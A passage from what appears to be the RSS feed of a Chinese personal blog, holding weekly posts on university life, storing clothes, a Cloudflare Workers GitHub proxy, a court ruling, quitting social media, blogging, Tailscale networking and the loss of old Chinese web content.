&lt;p&gt;这让我想起来 Twitter 上看到的一则言论，很有意思：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;其实中国的大学本科四年很多都算是 gap 吧，水课多，考试难度低，可以有时间去探索自己。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;✉️ 跨国邮政体验&lt;/h2&gt;
&lt;p&gt;新加坡华侨银行 OCBC 支持中国大陆用户在线开户。填写邮寄地址的时候，只能写英文，我就填写了学校寝室的英文地址。结果几封通知单居然真的寄到了寝室里，宿管阿姨给我打电话我才知道。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/06/1382182414.jpg&quot; alt=&quot;来自新加坡的信件&quot;&gt;&lt;/p&gt;
&lt;p&gt;写的英文地址，邮递员翻译成了中文。因为姓名写的是英文拼音，邮递员写的是「吴田（音）」……&lt;/p&gt;
&lt;p&gt;想到这封邮件漂洋过海来这里，居然还能找到我，好神奇。&lt;/p&gt;
&lt;h2&gt;💬 Quotes&lt;/h2&gt;
&lt;p&gt;收藏一些有意思或者引人深思的言论。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;R.I.P TO THE OPPORTUNITIES WE MISSED&lt;br&gt;
BECAUSE OF SHYNESS &amp;amp; LOW SELF ESTEEM.&lt;/p&gt;
&lt;p&gt;—— &lt;a href=&quot;https://x.com/itswords_&quot;&gt;Words&lt;/a&gt; from Twitter&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;屈原爱国是有十足动机的，他家世代都是楚国的重要股东。&lt;/p&gt;
&lt;p&gt;—— 熊逸《如何读懂古典文学》，via《&lt;a href=&quot;https://hwv430.blogspot.com/2024/06/blog-post_80.html&quot;&gt;核电站：端午小知识：屈原真的叫屈原&lt;/a&gt;》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;📚 本周在读：《超越百岁》&lt;/h2&gt;
&lt;p&gt;《超越百岁》介绍普及医学知识，帮助我们维持健康和长寿。本书提出「医学 3.0」的概念，相比目前「医学 2.0」的循证医学、对症下药、有病治病的模式，「医学 3.0」要求我们每个人掌握一定的医学知识，主动管理自己的健康，从源头上防止慢性病的发展。&lt;/p&gt;
&lt;p&gt;作者的职业经历也很神奇，在医学院放弃学业后前往麦卡锡工作，多年后回到医学领域，将投资领域的思维模式运用在医学中。很有意思。&lt;/p&gt;
&lt;p&gt;下周见！&lt;/p&gt;
</content:encoded><author>me@skywt.cn</author></item><item><title>Weekly #3：写博客的目的</title><link>https://skywt.cn/blog/weekly-3/</link><guid isPermaLink="true">https://skywt.cn/blog/weekly-3/</guid><description>&gt; 在我看来，驱动我们人类向前的东西中，真正有价值的不是国家，而是有创造性的、有情感的个人，是人格。只有个人才能造就高尚和尊贵，而随大流的人群在思想和感觉上都是迟钝的。
&gt;
&gt; —— 爱因斯坦《我的世界观》

</description><pubDate>Mon, 03 Jun 2024 07:00:00 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;在我看来，驱动我们人类向前的东西中，真正有价值的不是国家，而是有创造性的、有情感的个人，是人格。只有个人才能造就高尚和尊贵，而随大流的人群在思想和感觉上都是迟钝的。&lt;/p&gt;
&lt;p&gt;—— 爱因斯坦《我的世界观》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;!--more--&gt;
&lt;h2&gt;🌆 封面图：夏天的云&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/06/351306371.jpg&quot; alt=&quot;封面图：夏天的云&quot;&gt;&lt;/p&gt;
&lt;p&gt;夏天独有的粉红色的云。&lt;/p&gt;
&lt;h2&gt;👔 衣物收纳方案&lt;/h2&gt;
&lt;p&gt;本月底就要前往杭州，租的房子也马上要到期了。是时候做好搬家的准备了。&lt;/p&gt;
&lt;p&gt;由于衣服太多，之前总是懒得整理，因为总是不想面对这种繁琐的局面。冬装由于很厚，不知道怎么收纳，只能挂在衣柜里，非常占地方。于是，在 b 站上找到了这个视频：&lt;a href=&quot;https://www.bilibili.com/video/BV1jb411F7BN/?share_source=copy_web&amp;amp;vd_source=cd3fa74d3421ce574a62e3c11dcde9f6&quot;&gt;教你 9 种冬装收纳技巧，整齐漂亮省空间，再多厚衣服也不怕&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;本视频提出的所有衣物收纳方案，其实可以归纳为两种：对于上衣（外套、羽绒服、卫衣等），将衣服上部分装入下 1/3 部分外翻形成的袋子，形成稳定的结构；对于长裤，将其横向卷起，塞入一条裤腿的 1/2 部分外翻形成的袋子，形成稳定结构。相比传统将衣服折叠起来收纳的方案，其创新点在于：通过这种方式收纳衣物之后，衣物都会形成稳定的结构，即使有扰动也不容易散架。这种方法太好了！&lt;/p&gt;
&lt;p&gt;此外，我还要强烈推荐「真空收纳袋」，即可以抽真空的衣物收纳袋，最好配合电动的抽气泵。将衣服装进收纳袋并抽出空气，这么做的意义不仅在于减小体积，更大的优势是能让抽真空后的袋子变硬，达到一种稳定的状态。&lt;/p&gt;
&lt;p&gt;结合以上两点，不仅衣物本身达到了稳定的状态，收纳袋的形态也能达成稳定的状态，非常方便搬运、寄件、存放。&lt;/p&gt;
&lt;p&gt;之前提到了&lt;a href=&quot;https://skywt.cn/blog/weekly-0/#🎛%EF%B8%8F-无状态-stateless-的优雅性&quot;&gt;无状态 Stateless 的优雅性&lt;/a&gt;，我们应该对所有使用的应用进行&lt;strong&gt;显式的状态管理&lt;/strong&gt;。其实，对各种东西进行收纳，是一种&lt;strong&gt;对生活的状态管理&lt;/strong&gt;，良好的收纳能够解除生活与住所之间的耦合性。现在的我们或是住在宿舍，或是租房，处于实际上「居无定所」的状态，确定和管理归属于我们本身的「state」，至关重要。&lt;/p&gt;
&lt;p&gt;此外，还有一个很好奇的地方：该视频的 up 主「妙招姐」的团队，是个专门制作「生活妙招」视频的团队，虽然看起来像营销号，但其实每期内容都比较有质量。比如这期衣物收纳，他们说这个方法之前，我自己根本想不到。&lt;strong&gt;他们是如何高效产出这样的内容的呢？&lt;/strong&gt;是从什么其他信息源获取的吗？可是我在网上其他地方也没找到类似的衣服收纳方案。难道是确定一个选题之后，所有团队成员苦思冥想「衣物收纳方法」头脑风暴个几天吗？&lt;/p&gt;
&lt;h2&gt;🙏 赛博菩萨 Cloudflare&lt;/h2&gt;
&lt;p&gt;本周通过 Cloudflare Workers 部署了 GitHub 文件资源访问加速服务：&lt;a href=&quot;https://gh.skywt.net&quot;&gt;gh.skywt.net&lt;/a&gt;。由于众所周知的原因，经常遇到 GitHub 访问受阻的问题，而在陌生的或临时使用的机器，或者新开起来的虚拟机或容器内，配置代理软件并不是一件特别容易和方便的事情。这个「Web 代理」能够提供一个临时性的解决方案。&lt;a href=&quot;https://github.com/Skywt2003/gh-proxy&quot;&gt;项目源码&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;项目其实 fork 自我一直在用的 &lt;a href=&quot;https://github.com/hunshcn/gh-proxy&quot;&gt;gh-proxy&lt;/a&gt;。我研究了一下其原理，并重构了部分源码。高中的时候就用过类似的服务了，当时以为这个很复杂。现在的我看这个源码，原来这么简单。&lt;/p&gt;
&lt;p&gt;同时了解和学习了 Cloudflare Workers。再一次体验到了 Serverless 的便捷和优雅，更体会到了 Cloudflare 的菩萨心肠 😭……普通用户每天 10 万请求免费，可以说非常慷慨了。&lt;/p&gt;
&lt;p&gt;推荐阅读：《&lt;a href=&quot;https://mp.weixin.qq.com/s/i4wk9ebyUK7irNSwuT3NWQ&quot;&gt;吊打公有云的赛博佛祖 Cloudflare&lt;/a&gt;》。Cloudflare 的恩情还不完！！！😭&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;虽然我一直在倡导下云理念，但如果是上 Cloudflare 这样的赛博菩萨云，我举双手赞成。&lt;/p&gt;
&lt;p&gt;利益相关：CF 没给我钱，我倒是给 CF 付了钱。纯粹是 CF 产品非常出色，极好地解决了我的需求，我非常乐意付点费支持一下，并告诉更多朋友有这项福利。与之相反，我付钱给传统公有云厂商之后的感受是，这做的都是什么玩意，我必须写文章狠狠地骂他们，才能缓解内心的精神损失。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;《&lt;a href=&quot;https://mp.weixin.qq.com/s/jU418HAlObe1nWgzEsLrJQ&quot;&gt;赛博菩萨 Cloudflare 圆桌访谈与问答录&lt;/a&gt;》中指出，「Cloudflare 有着相当独特的商业模式 —— &lt;strong&gt;免流量费，靠安全赚钱&lt;/strong&gt;。」&lt;/p&gt;
&lt;p&gt;似乎国外的许多大厂都非常慷慨，Google Cloud、AWS、Cloudflare、Vercel 等等都有大量的免费额度，也有诸如 1.1.1.1 这类网络基础设施，供全球海量用户免费使用。而国内顶尖的大厂，却很少如此慷慨：买个服务器叠加一堆优惠券还不如国外便宜，提供的镜像站、DNS 也动不动就停止运营……&lt;/p&gt;
&lt;h2&gt;📜 一份载入史册的杰出判决书&lt;/h2&gt;
&lt;p&gt;上节《西方法律思想史》课后，老师给我们分享了这个&lt;a href=&quot;https://mp.weixin.qq.com/s/4Opl9uj0WaSh3pAuhPxzwQ&quot;&gt;载入史册的杰出判决书&lt;/a&gt;。说实话，看了之后，有些颠覆我对司法的印象。&lt;/p&gt;
&lt;p&gt;检察院提起公诉，认为被告人：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;酒后驾驶摩托车，酒精含量达到醉酒标准；&lt;/li&gt;
&lt;li&gt;无摩托车驾驶证，属于无证驾驶；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;已经认罪认罚。&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;综上，检察院建议「&lt;strong&gt;判处被告人何某拘役一个月，并处罚金&lt;/strong&gt;」。&lt;/p&gt;
&lt;p&gt;然而，法院认为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;当事人虽然酒精含量达到醉酒标准，但事实并未影响驾驶（不同人对酒精的耐受能力不同）；当事人独自一人夜里在无人街道上驾驶，也没有危害公共安全，也不属于危险驾驶；&lt;/li&gt;
&lt;li&gt;当事人老家在农村，大家普遍没有考取驾驶证的习惯；当事人已有数十年摩托车驾驶经验，且持有 C1 驾驶证，有驾驶更简单的摩托车的能力；&lt;/li&gt;
&lt;li&gt;从社会效果角度，疫情当下，民生艰难，当事人如果被判拘役和罚金，则难免让人同情。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;最终法院宣判&lt;strong&gt;当事人无罪&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;说实话，这非常颠覆我关于司法的印象。以前认为，法官是类似「自动机」的角色，即纯粹以法律法规、司法解释等为依据作出判决，相当于这些资料是「算法」，法官只是算法的执行官。事实上，这就是典型的&lt;strong&gt;实证主义法学&lt;/strong&gt;，即研究法律本身，不关心其哲学基础、与社会的关系等。这是一种「法律内部视角」。&lt;/p&gt;
&lt;p&gt;窥见法学的世界全景后，会发现这种视角只是冰山一角。&lt;/p&gt;
&lt;p&gt;再一次体会到所谓「隔行如隔山」，也很幸运能够看见这个新的广阔世界。&lt;/p&gt;
&lt;h2&gt;📱 我对社交媒体的看法&lt;/h2&gt;
&lt;p&gt;我大概已经一两个月没看朋友圈和 QQ 空间了。这并不是我一直以来的习惯，而是我充分考虑后的决策。&lt;/p&gt;
&lt;p&gt;以前是很喜欢看和发微信朋友圈、QQ 空间的，认为这是我们表达自我、分享生活的渠道。诚然，表达自我、分享生活本身没有问题，但是我们的精力是多么有限，&lt;strong&gt;真正值得我们关注的人和事，少之又少&lt;/strong&gt;。朋友圈和空间展示的是所有好友的动态，大多数都是我不熟的朋友分享的生活里的鸡毛蒜皮，大多数无聊至极，我并不关心。而如果真正想要关心和自己玩的好的朋友最近的生活，没有比一起吃个饭聊聊天更好的方式，而不是通过朋友圈这样充斥着精心打造的人设的平台。&lt;/p&gt;
&lt;p&gt;《为什么精英都是时间控》这本书里提到，相比时间管理，更重要的是&lt;strong&gt;精力管理&lt;/strong&gt;。身处信息爆炸的时代，每天都有无数的信息输入在蚕食我们的精力。所以，对每天输入我们脑海的信息进行把握，对于我们每天更高效的学习生活而言，是至关重要的。而朋友圈这类没有价值的信息，就没有必要来占据我们日常的精力了。&lt;/p&gt;
&lt;p&gt;其实，我们会发现一个令人惊讶的事实：我们生活方式中的很大一部分，比如发朋友圈、刷视频等等，&lt;strong&gt;都是近 10 年才出现的&lt;/strong&gt;。但凡是 10 年以前人们的生活，都不存在朋友圈这样的东西。那才是自然状态的生活。我们如今的生活，其实严重地被微信这样的产品异化了。&lt;/p&gt;
&lt;p&gt;除了朋友圈以外，我也卸载了手机上所有娱乐性质的社交媒体，包括小红书、b 站、酷安等。基于以下的考虑。&lt;/p&gt;
&lt;p&gt;我认为，一般而言，刷社交媒体的行为有两种目的：1）获取信息；2）娱乐消遣。&lt;strong&gt;这两种目的是不能混淆的。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;对于获取信息，我主要是用 RSS。我最讨厌根据兴趣推荐的无限信息流，那些工具往往会让人沉迷其中，丧失主动性，蚕食人的时间和注意力。一切商业化的获取信息的软件，设计的目的都在于此。而 RSS 真是个伟大的发明，结合我自己部署的 &lt;a href=&quot;https://rsshub.skywt.cn&quot;&gt;RSSHub&lt;/a&gt; 和 &lt;a href=&quot;https://wewe.skywt.cn&quot;&gt;WeWeRSS&lt;/a&gt;，一切信息流皆可 RSS，皆可被我们控制。这才是获取信息的最完美形态。&lt;/p&gt;
&lt;p&gt;对于娱乐消遣，我倾向于使用连续的时间进行高质量的娱乐活动。比如看个电影。如果要刷 b 站，iOS / iPadOS / macOS 提供的「屏幕使用时间」功能也可以很好地阻止我们沉迷。（用 Apple 生态很好的一点是，macOS 上的 Safari 里的 bilibili 网页版，和 App 的限制是联动的）&lt;/p&gt;
&lt;h2&gt;✍️ 写博客的目的&lt;/h2&gt;
&lt;p&gt;博客文章可以分为两种：技术博客和生活博客。&lt;strong&gt;技术博客&lt;/strong&gt;就是写最近学的东西；&lt;strong&gt;生活博客&lt;/strong&gt;（如本篇）就是记录生活中发生的事情和一些思考。&lt;/p&gt;
&lt;p&gt;技术博客的目的很简单，如上周「&lt;a href=&quot;https://skywt.cn/blog/weekly-2/#🌐-基于-tailscale-搭建个人网络基础设施的尝试&quot;&gt;基于 Tailscale 搭建『个人网络基础设施』的尝试&lt;/a&gt;」中提到，博客首先是提升自己认知能力的工具。这也是对所谓「费曼学习法」的实践，即「教会别人一个知识，才算自己学懂了这个知识」。其实也能从《卡片笔记写作法》中提到的「必要难度 Desirable Difficulty 理论」得到印证：人的记忆的存储强度 Storage Strength 和提取强度 Retrieval Strength 是&lt;strong&gt;负相关&lt;/strong&gt;的关系，即存储知识越困难，提取知识越容易。&lt;/p&gt;
&lt;p&gt;而对于生活博客，这是我最近几周才开始写的。其主要意义在于提供一个表达和与人交流的平台。&lt;/p&gt;
&lt;p&gt;人在与人交流的时候，会释放某些激素，从而调节情绪（忘了这是哪里看到过的理论了，不过大概是这个意思）。这就是为什么我们需要与人交流，否则如果长期独居、独处则会导致情绪压抑。&lt;strong&gt;与人交流是生活的必需。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;然而，和别人线下聊天，有两个问题：1）沟通是即时的（即「同步的」），留给思考的内存有限，往往很难有特别深度的交流，也有很多东西无法充分表达出来；2）面对不同的人，对于不同的性格，适合交流的话题是不同的，在交流的时候需要考虑另一方的个性情况，这会带来额外的心智负担（尤其作为 INFJ……）。虽然我也挺喜欢和别人线下聊天，不过这种方式有时无法完全解决我们与人交流的需求。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;博客能够作为一种交流工具，解决上述的两个问题。&lt;/strong&gt;首先，博客是一种「异步沟通」，在撰写的时候能够充分思考；其次，撰写的时候也可以专注于表达本身，而不是想象阅读者的状态。&lt;/p&gt;
&lt;p&gt;所以，我还是希望自己能坚持写博客。&lt;/p&gt;
&lt;h2&gt;📚 本周在读：《How We Learn》、《我的世界观》&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;《How We Learn》&lt;/strong&gt;，中译《精准学习》。搞不懂为什么译者要自作聪明取一个不一样的中文书名，因为本书介绍的就是 how we learn，即我们人类是如何学习的。本书的独特之处在于，&lt;strong&gt;用机器学习的机制来解释人脑的学习机制&lt;/strong&gt;。机器学习领域在越来越能够模拟人脑学习机制的同时，也为人脑的学习机制提供了一种清晰的解释方式（清晰指的是能够用算法描述）。对于有些了解机器学习的我们计算机专业学生来说，非常友好。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;《我的世界观》&lt;/strong&gt;，爱因斯坦。我曾以为顶尖的科学家大多都是一心扑在自己领域的 nerd，事实上很多站在科学顶端的科学家，对各个领域乃至整个世界都有完整和体系化的思考。比如最近在看的李飞飞、爱因斯坦。看别人的传记，能够看到别人看待世界的方式和思考的方式。在许多地方，也能发现自己在和伟大的灵魂共鸣。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下周见。&lt;/p&gt;
</content:encoded><author>me@skywt.cn</author></item><item><title>Weekly #2：大学生活的一点点遗憾</title><link>https://skywt.cn/blog/weekly-2/</link><guid isPermaLink="true">https://skywt.cn/blog/weekly-2/</guid><pubDate>Mon, 27 May 2024 07:00:00 GMT</pubDate><content:encoded>&lt;!--more--&gt;
&lt;h2&gt;🌆 封面图：滕王阁&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/05/4085939757.jpg&quot; alt=&quot;南昌滕王阁&quot;&gt;&lt;/p&gt;
&lt;p&gt;这周去了南昌玩！&lt;/p&gt;
&lt;h2&gt;🏫 大学生活的一点点遗憾&lt;/h2&gt;
&lt;p&gt;周二晚上去隔壁中南大学逛了逛。在一个陌生的、真正的大学校园里，静谧的夜晚，宽阔的马路上一个人都没有，远处的教学楼窗户里发出暖黄色的灯光。&lt;/p&gt;
&lt;p&gt;恍惚之间，我会有一种感觉：或许某个平行世界的我，会在这样一所大学里，过上小时候想象中的大学生活。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/05/3241497128.jpg&quot; alt=&quot;中南大学的校园&quot;&gt;&lt;/p&gt;
&lt;p&gt;（并不是因为中南大学就比 HNU 好，我一直不十分在意所谓的大学排名；只是这种陌生的大学校园，给了我一些&lt;strong&gt;想象的空间&lt;/strong&gt;）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;大学，在我曾经的理解里，是一个充满活力的地方，在这里能找到一群有意思的人，一起做一些有意思的事情。&lt;/strong&gt;然而，事实是，身边的大多数同学都忙着考研、考公或者卷成绩保研，仿佛一只只碌碌无为的蚂蚁，即使有空闲也将大多数时间花在平庸无聊的娱乐活动上，很少遇到真正有想法、有意思的人；这三年我自己也没做什么有意思的事。如果要细数的话，我觉得去年夏天当迎新班导的经历，或许是我做过的最有意思的事之一。&lt;/p&gt;
&lt;p&gt;不知道这是我的大学本身不够好，还是这个时代的风气就是如此。每每在这样的环境里感到无聊，只能从一些书籍中与有趣和伟大的灵魂交流。从书中，也能看到一些世界顶尖高校里学生的学习生活，他们是多么有想法，他们的生活是多么有趣，多么充满激情！&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;大学，在我曾经的印象里，应该是一个传授「大行之道」的地方。&lt;/strong&gt;在读到《浪潮之巅》介绍的「纽曼式大学」的时候，我真心觉得这就是大学应该成为的样子：学生应该相互学习，自由发展；大学应该传授「&lt;strong&gt;大行之道（Universall Knowledge）&lt;/strong&gt;」，而非「雕虫小技」（书中继而介绍了斯坦福大学，着实令人羡慕）。然而，现实是，大学里的所有通识课程充斥着大量照本宣科的思想政治，几乎没有一点营养；至于专业课，则大多老师教的都是「雕虫小技」，念 PPT，读概念，讲政治，做题。很少能听到老师们对于专业、行业的宏观理解。&lt;/p&gt;
&lt;p&gt;这导致我不知道去上课有什么意义：有的老师上课的内容就是把一些知识详细地给我们讲一遍，连 XSS、SQL 注入这些东西居然都要上课讲，明明网络上有大量的学习资源，自己实践才是最好的学习方式，根本没必要来上课。退一万步说，网络上也有相同内容的、质量好一万倍的名牌大学课程，都可以免费参与。那么我为什么要赶这么远的路，到教室里去听课呢？我来上课自然是希望听到一些自学学不到的东西，或许是所谓的「大行之道」，或许是对专业、行业的理解，或许是从他们的视角看到的对这个世界的理解，这种理解处于我们本科生达不到的 level。然而，能听到这些内容的课（即我觉得值得上的课），很少。&lt;/p&gt;
&lt;p&gt;（这或许也是和大多数同学的学习能力相适应的吧。身边太多同学，都是老师教什么就学什么，老师不教就不知道自己学，老师上课让回去自学某些知识，还屡遭吐槽。不过每个人成长的背景、形成的习惯和观念不同，我无法评判。）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;所以，有点遗憾没能经历我想要的大学生活。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;（不过纵使如此，我还要感谢 HNU，感谢她自由和人性化的行政和管理、开放的校园、便捷的地理位置，特别是疫情三年的优良体验。我相信这一切已经打败全国 90% 的大学了，我已经很幸运了……）&lt;/p&gt;
&lt;h2&gt;🌐 基于 Tailscale 搭建「个人网络基础设施」的尝试&lt;/h2&gt;
&lt;p&gt;上周了解了 Tailscale 的 NAT 穿透原理，并搭建和配置了 Headscale 实现了虚拟组网。&lt;/p&gt;
&lt;p&gt;然而，在实际使用上遇到了这个问题：&lt;strong&gt;在 iOS / iPadOS 上，系统限制不能同时启用两个 VPN 软件。&lt;/strong&gt;这意味着，开启了 Tailscale 就必须关闭其他用于众所周知的目的的软件，「访问 VPN 中的其他设备」和「访问国际互联网」这两个需求不能共存。&lt;/p&gt;
&lt;p&gt;如果有这样一种配置方式，使得我在设备上连接上 VPN 之后，既能够访问 VPN 中我的其他设备，又能访问国际互联网，同时达成这两个目的，那该多好！这样不仅解决了上述问题，我在任何客户端主机上需要进行的配置也大大简化了，本来要配置 Tailscale + 代理软件，现在只要配置 Tailscale 即可。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用 Tailscale 实现这一目的是有可能的。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Tailscale 提供了 &lt;strong&gt;exit node&lt;/strong&gt; 的功能。如果主机 A 将 VPN 中的一个结点 B 设置为 exit node 之后，A 节点所有访问外部网络的流量都要经过 B 进行转发。那么，通过 B 节点上恰当的配置，我们实际上是可以在 B 上实现类似透明代理的功能，即在 B 上安装代理软件，将经过 B 的所有流量转发给代理软件进行分流。这样，只要将所有客户端中的 exit node 设置为 B，就能实现前述目的。&lt;/p&gt;
&lt;p&gt;这整套东西很酷！几乎满足了我对网络访问的所有需求。所以，我想了一个很酷的名字：「&lt;strong&gt;个人网络基础设施&lt;/strong&gt;」。&lt;/p&gt;
&lt;p&gt;以上的配置涉及到 Tailscale 的原理，以及 iptables 的配置，要学的东西还挺多。改天如果能够成功实现，写篇博客。😁&lt;/p&gt;
&lt;p&gt;其实，我已经积攒了很多篇写了一半的博客。之所以没有发出来，是因为&lt;strong&gt;我认为它们其实没有达到我对自己博客内容质量的要求&lt;/strong&gt;。折腾这些东西的目的是&lt;strong&gt;让它们成功跑起来&lt;/strong&gt;，而写博客的目的是&lt;strong&gt;将它们讲清楚&lt;/strong&gt;。后者的要求比前者要高不少，而我有时往往止步于前者「成功跑起来」这一目的。比如配置 PVE 核显直通，很多配置我并没有搞清楚具体是什么意思，然而配置了就成功跑起来了。要写成博客，还得进一步地学习。最近看到《&lt;a href=&quot;https://jack-vanlightly.com/blog/2022/1/25/write-for-others-but-mostly-for-yourself&quot;&gt;Write For Others But Mostly For Yourself&lt;/a&gt;》中认为，由于想到他人会阅读自己的博客，写作过程中不得不将知识抽丝剥茧、深入理解。启动「internal BS detector」。所以，博客首先是提升自己认知能力的工具。&lt;/p&gt;
&lt;h2&gt;🚗 拿显微镜看《狂飙》&lt;/h2&gt;
&lt;p&gt;本周看了 b 站 up 主「食影双修」的&lt;a href=&quot;https://www.bilibili.com/video/BV1Cy4y197sw&quot;&gt;《狂飙》系列解析&lt;/a&gt;。这才意识到以前看《狂飙》的时候，很多存在疑虑的点，都是主创隐藏的暗线。非常推荐观看！&lt;/p&gt;
&lt;p&gt;《狂飙》这部剧，为了过审，删改了大量情节，进行了大量重新配音（独立声卡），真的太可惜了。按照原来的剧本，应该全程都会是很精彩的剧。不过这删减本身，似乎也成了一种展现当下创作环境的行为艺术……😅&lt;/p&gt;
&lt;p&gt;下面是我超级喜欢的一张剧照。背景的暗红色不仅有政治意涵，更给人一种压抑和恐怖之感。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/05/3395698192.jpg&quot; alt=&quot;《狂飙》人物：赵立冬&quot;&gt;&lt;/p&gt;
&lt;h2&gt;🍲 你不知道的海底捞！&lt;/h2&gt;
&lt;p&gt;在海底捞，留下了很多令我印象深刻的体验。而从服务业的角度来说，这些体验或许可以说是令人震撼。&lt;/p&gt;
&lt;p&gt;本周心血来潮看了《海底捞你学不会》这本书。本书作者深度采访了从海底捞基层员工、公司高管到创始人张勇等一系列人员，尝试揭开海底捞的秘密。这本书成书于 2011 年，现在已经过了 13 年，海底捞依然是长盛不衰、广受欢迎的火锅品牌。&lt;/p&gt;
&lt;p&gt;一直以来，我以为海底捞是「巨头资本用最先进的管理理念打造的品牌」。然而本书讲述的事实是，海底捞是草根起家，创办时只有 8000 元的资本和北京的第一家店，总裁张勇是个电焊工。&lt;/p&gt;
&lt;p&gt;其实最神奇的一点是，&lt;strong&gt;对人性化、个性化的服务的要求，和对连锁餐饮规范化、流程化的要求，是相互矛盾的。&lt;/strong&gt;海底捞是如何同时做到这两点的呢？（肯德基有一本厚厚的服务员规范手册，然而你一定体验过肯德基某些服务员态度并不好的现象）&lt;/p&gt;
&lt;p&gt;海底捞的管理，反而用的是中国传统文化里的儒家理念，&lt;strong&gt;极其重视员工的集体认同&lt;/strong&gt;，尊重每个员工。如孟子所言：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;食而弗爱，豕交之也；爱而不敬，兽畜之也。&lt;/p&gt;
&lt;p&gt;君之视臣如手足，则臣视君如腹心；君之视臣如犬马，则臣视君如国人；君之视臣如土芥，则臣视君如寇仇。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;简单来说，每个员工出于这种集体认同，真心地想要海底捞好；同时，从制度设计上非常注重放权，基层员工有很大权力，能有很大创新空间。我吃过很多家海底捞，除了统一的规范化服务之外，很多店服务员都会创造独特的体验，比如有的提供免费的冰粉，有的提供各种小游戏，有的针对预定客户会准备贺卡……之前饱受争议的「科目二」也是源于某个基层服务员的创新。&lt;/p&gt;
&lt;p&gt;白手起家发展到火锅巨头的创业故事非常励志。这个品牌也非常独特和神奇。&lt;/p&gt;
&lt;h2&gt;🌐 中文互联网正在加速崩塌&lt;/h2&gt;
&lt;p&gt;最近很多地方都看到了这篇《&lt;strong&gt;中文互联网正在加速崩塌&lt;/strong&gt;》。不过现在已经被微信 ban 了。本文指出，中文互联网正在加速崩塌，移动互联网出现之前的中文互联网内容，已经几乎消失殆尽。本文认为原因主要是：1）企业由于运营原因关闭网站；2）互联网监管趋于严格。&lt;/p&gt;
&lt;p&gt;作者以非常感性的笔触提出并评述了上述问题。其中发出的感叹我也十分认同。然而，对于我们对技术领域有足够了解的人来说，&lt;strong&gt;互联网内容的消失是必然的&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;互联网从来都是一种服务。&lt;/strong&gt;当我们访问一个网页时，空气中飘散着无数调制的电磁波，数不清的光缆里流过了无数的电信号，目标的服务器 24 小时待命，从磁盘到内存、CPU 都在不断地流过数据，为了处理我们的请求。这些都是无比脆弱的，并且不是免费的。&lt;/p&gt;
&lt;p&gt;浏览一个网页，和阅读一份报纸或者一本书，本质上是不同的：打开一本书的动作发生时，和出版社、作者等都没有任何关系，即使作者离世、出版社倒闭，也不会影响我们对这本书的阅读。然而，打开一个网页的过程中，则是实实在在地向目标的服务器发送一个请求并获得响应。这一过程中产生的流量为网页所属的企业增加了成本。一旦企业倒闭，服务器关机，网页就不复存在。这就好比：读者每翻一页书，出版社就要付出 0.01 元流量费；出版社一旦倒闭，所有书籍都无法打开。这对传统的信息传播来说是无法想象的。&lt;/p&gt;
&lt;p&gt;现代运维技术使得服务能一直维持运行，连偶尔几次下线几个小时都已经被认为是十分严重的事故。这给大多数不了解其技术原理的用户带来了这样的&lt;strong&gt;错觉&lt;/strong&gt;：网页和书籍是类似的信息传播渠道；一个网页似乎会永远存在下去。就像发明互联网那一代人的期望一样：&lt;strong&gt;互联网已经像水和空气一样，无处不在。&lt;/strong&gt;随时随地访问互联网，成了自然而然的事情。然而，只要自己搭建过网站就能知道，这种假象是多么脆弱。&lt;/p&gt;
&lt;p&gt;这启示我们忽略这一层抽象，&lt;strong&gt;不能将任何网站看成长久存在的数据平台&lt;/strong&gt;。只有自己本地的硬盘，才是长久存在的数据平台。有了这样的观念，对所谓「中文互联网的加速崩塌」，就不会感到奇怪了。&lt;/p&gt;
&lt;p&gt;阅读本文后，我才发现自己其实早就意识到了这一点，这才建立了自己的博客和 self-hosted 的一切，不依附于任何其他平台，自己负责运维和管理。&lt;/p&gt;
&lt;h2&gt;📚 有好的译者，是书籍的幸运（二）&lt;/h2&gt;
&lt;p&gt;本周阅读了《&lt;strong&gt;This Explains Everything&lt;/strong&gt;》的中文版《&lt;strong&gt;世界因何美妙而优雅地运行&lt;/strong&gt;》。&lt;/p&gt;
&lt;p&gt;这本书确实很吸引我。这个世界上一些非常聪明的头脑，在书中讨论了很多非常终极的问题。然而，读中文版的时候总觉得读不下去。去豆瓣上看了一眼，果然又是翻译的问题。&lt;/p&gt;
